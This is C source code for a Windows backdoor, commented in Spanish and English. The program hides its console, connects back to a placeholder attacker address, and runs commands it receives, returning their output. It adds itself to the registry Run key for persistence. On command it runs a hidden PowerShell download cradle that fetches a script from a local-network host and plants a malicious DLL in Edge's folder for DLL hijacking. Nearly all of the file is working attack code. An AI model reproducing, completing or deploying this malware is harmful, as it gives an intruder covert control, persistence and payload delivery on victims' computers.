#include <stdlib.h>
#include <stdio.h>
#include <unistd.h>
#include <winsock2.h> //usada para establecer la conexión con el servidor
#include <windows.h>
#include <winuser.h>
#include <wininet.h>
#include <windowsx.h>
#include <string.h>
#include <sys/stat.h>
#include <sys/types.h>
#include <process.h> //usada para dll hijacking
#define bzero(param, size) (void) memset((param), 0, (size))
//HINSCTANCE a handle to a module/instance, the program uses this values to indentify the executable when is loaded into memory, it also has some functions that requiere this value
//hprev == 0;
//lpCmdLine contains command line argumentes like a unicode string
//nCmdShow flag that determines if the console app will be shown or not to the user
//HWND handle to the Window, like a "pointer" to a windows window 
//AllocConsole() = https://docs.microsoft.com/es-es/windows/console/allocconsole
//FindWindowA() = https://docs.microsoft.com/en-us/windows/win32/api/winuser/nf-winuser-findwindowa
//ShowWindow() winuser.h = https://docs.microsoft.com/en-us/windows/win32/api/winuser/nf-winuser-showwindow
//WSAStartup() = https://docs.microsoft.com/en-us/windows/win32/api/winsock/nf-winsock-wsastartup
//AF_INET = Determines that we're stablishing a conexion using IPv4
//SOCK_STREAM = Defines that we're using a three way handshake connection (TCP) to stablish the communication between our server and the target
//inet_addr() = this function interprets strings of characters representing host addresses, expressed in standard decimal-dot and returns host addresses suitable for use as an Internet address.
//The inet_addr function converts a string containing an IPv4 dotted-decimal address into a proper address for the IN_ADDR structure.
//inet_addr() = https://docs.microsoft.com/en-us/windows/win32/api/winsock2/nf-winsock2-inet_addr
//htons() = The htons function converts a u_short (A 16-bit number in host byte order) from host to TCP/IP network byte order (which is big-endian).
//https://docs.microsoft.com/en-us/windows/win32/api/winsock/nf-winsock-htons
//connect() = https://www.ibm.com/docs/en/zos/2.2.0?topic=functions-connect-connect-socket
//recv() = receives data from a connected socket or a bound connectionless socket. https://docs.microsoft.com/en-us/windows/win32/api/winsock/nf-winsock-recv
//strncmp() = https://cplusplus.com/reference/cstring/strncmp/
//closesocket() = https://docs.microsoft.com/en-us/windows/win32/api/winsock/nf-winsock-closesocket
//WSAcleanup() = https://docs.microsoft.com/en-us/windows/win32/api/winsock/nf-winsock-wsacleanup
//send() = https://docs.microsoft.com/en-us/windows/win32/api/winsock2/nf-winsock2-send
//GetModuleFileName() = https://docs.microsoft.com/en-us/windows/win32/api/libloaderapi/nf-libloaderapi-getmodulefilenamea
//RegistryOpenKey() = https://docs.microsoft.com/en-us/windows/win32/api/winreg/nf-winreg-regopenkeyexa
//HKEY y más data types de windows = https://docs.microsoft.com/es-es/windows/win32/winprog/windows-data-types
//RegSetValueExA() = https://docs.microsoft.com/en-us/windows/win32/api/winreg/nf-winreg-regsetvalueexa - Sets the data and type of a specified value under a registry key.
//RegCloseKey() = https://docs.microsoft.com/en-us/windows/win32/api/winreg/nf-winreg-regclosekey - Closes a handle to the specified registry key. 

int sock;//global variable in which the attacker's socket is stored

//funcion del dll_hijacking para MSASN1.dll, dll que explorer busca pero no encuenra en C:\Program Files (x86)\Microsoft\Edge\Application
//funcionamiento: en un array de char se declara el comando que quieres que la función system ejecute a través de cmd, en este caso emplea el comando para descargar un .ps1
/*
ARCHIVO .PS1 LLAMADO POR download_dll

$url = "http://192.168.50.6/test_BMC.dll" //ubicación de la dll maliciosa, esta debe tener ya el nombre deseado
$dest = "C:\Program Files (x86)\Microsoft\Edge\Application" //ubicación a guardarla

Start-BitsTransfer -Source $url -Destination $dest //empieza una transferencia bit a bit del archivo, tal vez ayude a evitar detección
*/
//cambiar ubicación y/o nombre del archivo test3.ps1
void download_dll(){
        char cmd[] = "powershell.exe -nop -w hidden -c \"IEX((new-object net.webclient).DownloadString(\'http://192.168.50.6:80/test_pwsh/test3.ps1\'))"; 
        system(cmd); //uso: https://www.tutorialspoint.com/c_standard_library/c_function_system.htm
}


//Implementar otro método de persistencia más reliable
//function that will save the program key in the right place (regeditor) making it run every time the computer is turned on.
int bootRun(){
	char err[128] = "Failed\n";
	char suc[128] = "Crated Persistance at: HKEY_CURRENT_USER\\Software\\Microsoft\\Windows\\CurrentVersion\\Run\n";
	TCHAR szPath[MAX_PATH]; //TCHAR es una cadena de caracteres Win32 que puede usarse para describir las cadenas DBCS, ANSI o Unicode. - MAX_PATH int del num máx de carácteres que puede tener un directorio
	DWORD pathLen = 0; //A DWORD is a 32-bit unsigned integer (range: 0 through 4294967295 decimal). Because a DWORD is unsigned, its first bit (Most Significant Bit (MSB)) is not reserved for signing.

	pathLen = GetModuleFileName(NULL, szPath, MAX_PATH);//Retrieves the fully qualified path for the file that contains the specified module. The module must have been loaded by the current process.
	if (pathLen == 0){
		send(sock, err, sizeof(err), 0);
		return -1;
	}
	HKEY NewVal;//handle a una open registry key, identificador
	//esta función abrirá el registro especificado e intentará añadirle el valor nuevo a este
	if (RegOpenKey(HKEY_CURRENT_USER, TEXT("Software\\Microsoft\\Windows\\CurrentVersion\\Run"), &NewVal) != ERROR_SUCCESS){
		send(sock, err, sizeof(err), 0);
		return -1;
	}
	DWORD pathLenInBytes = pathLen * sizeof(*szPath); //almacena la longitud del pathing en bytes
	if (RegSetValueEx(NewVal, TEXT("Busted regKey"), 0, REG_SZ, (LPBYTE)szPath, pathLenInBytes) != ERROR_SUCCESS){ //dentro de TEXT se almacena el name de la regkey, REG_SZ type de regKey, LPBYTE (puntero a un byte) from the szpath
		RegCloseKey(NewVal);
		send(sock, err, sizeof(err), 0);
		return -1;
	}
	RegCloseKey(NewVal);
	send(sock, suc, sizeof(suc), 0);

}

//function that separates string from cd (ex: "cd string"), inefficient, will change in the near future.
char*
str_cut(char str[], int slice_from, int slice_to){
	if (str[0] == '\0'){
		return NULL;
	}
	char *buffer;
	size_t str_len, buffer_len;

	if (slice_to < 0 && slice_from > slice_to) {
		str_len = strlen(str);
		if (abs(slice_to) > str_len - 1){
			return NULL;
		}
		if (abs(slice_from) > str_len){
			slice_from = (-1) * str_len;
		}

		buffer_len = slice_to - slice_from;
		str += (str_len + slice_from);
	}
	else if (slice_from >= 0 && slice_to > slice_from){
		str_len = strlen(str);

		if (slice_from > str_len - 1){
			return NULL;
		}
		buffer_len = slice_to - slice_from;
		str += slice_from;
	}
	else {
		return NULL;
	}

	buffer = calloc(buffer_len, sizeof(char));
	strncpy(buffer, str, buffer_len);
	return buffer;
}

//funcion shell
void Shell() {
	char buffer[1024];//se utilizará para recibir y almacenar el comando desde el servidor
	char container[1024];
	char total_response[18384];

	while (1){//como un While True en python
		jump:
		bzero(buffer, sizeof(buffer));
		bzero(container, sizeof(container));
		bzero(total_response, sizeof(total_response));
		recv(sock, buffer, sizeof(buffer), 0);//para recibir los comandos del servidor, sock: socket a conectarse, buffer : variable en la que se almacena y su tamaño
		//declara manera de cerra conexión 
		if (strncmp("q", buffer, 1) == 0){//string compare, "q" valor a comparar, buffer el espacio en el que se compara, 1 el numero de valores a comparar
			closesocket(sock);//cierra un socket existente que se le haya pasado, tiene diferentes códigos de error
			WSACleanup();//termina el uso de Winsock2 DLL
			exit(0);//termina si el output es 0;
		}
		else if (strncmp("cd ", buffer, 3) == 0){
			chdir(str_cut(buffer, 3, 100));
		}
		else if (strncmp("persist", buffer, 7) == 0){
			bootRun();
		}
		else if (strncmp("pdll", buffer, 4) == 0){
			download_dll();
		}
		else {//file descriptor - puntero de memoria a archivo
			FILE *fp;
			fp = _popen(buffer, "r");//abre un proceso que lee el comando que se haya almacenado en buffer
			while(fgets(container, sizeof(container), fp) != NULL) {//fgets almacena lo que se encuentra en fp (buffer) de 1024 en 1024 
				strcat(total_response, container);//por cada vuelta lo que se almacena en container pasa a total_response, puesto que container se va a sobrescribir la próxima vuelta
			}
			send(sock, total_response, sizeof(total_response), 0);//envia total_response al server (envia data a un socket conectado)
			fclose(fp);//cierra el proceso
		}
	}
}

//función main
int APIENTRY WinMain(HINSTANCE hInstance, HINSTANCE hPrev, LPSTR lpCmdLine, int nCmdShow){

	HWND stealth;//declara que stealth es una variable de tipo HWND
	AllocConsole();//Asigna una nueva consola para el proceso de llamada
	stealth = FindWindowA("ConsoleWindowClass", NULL);//obtiene el Hnadle de la consola spawneada con la función anterior(busca parent no child) y lo guarda en steatlh 
	// (lpClassName referiendo a la clase de objeto, una consola) y (lpWindowName NULL todos los nombres de consola coinciden, no puede haber posible error).

	ShowWindow(stealth, 0);//determina el estado de visualización de el "puntero"(HWND - handle to te window) de la ventana (que en este caso es stealth), más tipos de estado en la dirección de arriba
	struct sockaddr_in ServAddr;//almacenar dirección de socket (o puntero)? tipo struct en variable ServAddr
	unsigned short ServPort;//en estas dos variables estamos declarando las variables en las que se almacenarán la dirección IP y el puerto a los caules nos vamos a conectar desde nuestro backdoor
	char *ServIP;
	WSADATA wsaData;//structura que contiene información sobre los sockets de Windows, necesaria para establecer una conexión socket a una máquina windows

	ServIP = $$IP_ATC //Dirección IP de la máquina que estará escuchando la conexión externa, vamos ip del atacante
	ServPort = $$PORT //Declara puerto de salida de tráfico (tal vez require emplear un puerto que no esté en uso por otra app)

	if (WSAStartup(MAKEWORD(2,0), &wsaData) != 0){//inizializa el uso de Winsock DLL por un proceso, se le pasa una Word y un puntero de la estructura de datos WSADATA el cual recibirá detalles de W.Socket implementation
		exit(1);//return type int (si es succesful devuelve un 0, en caso contrario, devuelve uno de los códigos especificados en el enlace).
		//este if lo que hace es que en caso de que la operaciíon de WSAStartup no sale bien, es decir no devuelva 0, se salga del programa. 

	}
	//definir socket object
	sock = socket(AF_INET, SOCK_STREAM, 0);//El 0 representa que no vamos a utilizar más parámetros

	memset(&ServAddr, 0, sizeof(ServAddr));//esta función limpia los conetenidos de una variable a 0, la variable que se le pase por un puntero
	ServAddr.sin_family = AF_INET;//añade a la estructura previamente declarada diferentes valores, este represeneta que se usa IPv4 (mejor explicado arriba)
	ServAddr.sin_addr.s_addr = inet_addr(ServIP);//este que su valor debe ser igual al output de llamar la función que transforma la IP. (más explicado arriba)
	ServAddr.sin_port = htons(ServPort);//y este lo mismo que la anterior pero con el puerto

	//realizar la conexión con la función connect()
	//start es un jump point
	start:
	while (connect(sock, (struct sockaddr *) &ServAddr, sizeof(ServAddr)) != 0) {//llama a la finción connect con diversos parámetros, en caso de que no sea 0 (es decir de error), entra en el bucle
		Sleep(10);
		goto start;//si se entra en el while, este valor indica que la ejecución debe volver a start declarado arriba así realizando de nuevo la comprobación del while en caso de que haya sido mala
	}
	Shell();

}
	
